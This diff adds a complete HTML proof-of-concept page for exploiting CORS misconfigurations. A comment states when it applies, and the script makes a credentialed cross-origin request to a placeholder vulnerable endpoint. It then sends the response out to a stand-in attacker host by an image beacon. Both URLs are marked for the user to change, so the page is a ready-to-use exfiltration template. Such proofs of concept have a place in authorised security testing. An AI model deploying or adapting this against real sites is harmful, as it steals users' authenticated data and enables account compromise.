@@ -1,0 +1,45 @@
+<!doctype html>
+<!--
+CORS PoC: Credentialed GET request with response exfiltration.
+
+Useful when:
+- Access-Control-Allow-Origin reflects attacker origin
+- Access-Control-Allow-Credentials is true
+- Sensitive authenticated data is readable cross-origin
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CORS Credentialed GET</title>
+  <meta name="referrer" content="no-referrer">
+</head>
+<body>
+
+<button id="run">Run Exploit</button>
+
+<script>
+  const TARGET_URL = "https://vulnerable-site.example/api/endpoint"; // change
+  const BEACON_URL = "https://attacker.example/log?data=";           // change
+
+  document.getElementById("run").onclick = async () => {
+    try {
+      const response = await fetch(TARGET_URL, {
+        credentials: "include"
+      });
+
+      const data = await response.text();
+
+      console.log("RECEIVED RESPONSE:", data);
+
+      // Exfiltrate data to attacker server
+      new Image().src = BEACON_URL + encodeURIComponent(data);
+
+      console.log("Beacon sent");
+    } catch (err) {
+      console.error("Request failed:", err);
+    }
+  };
+</script>
+
+</body>
+</html>
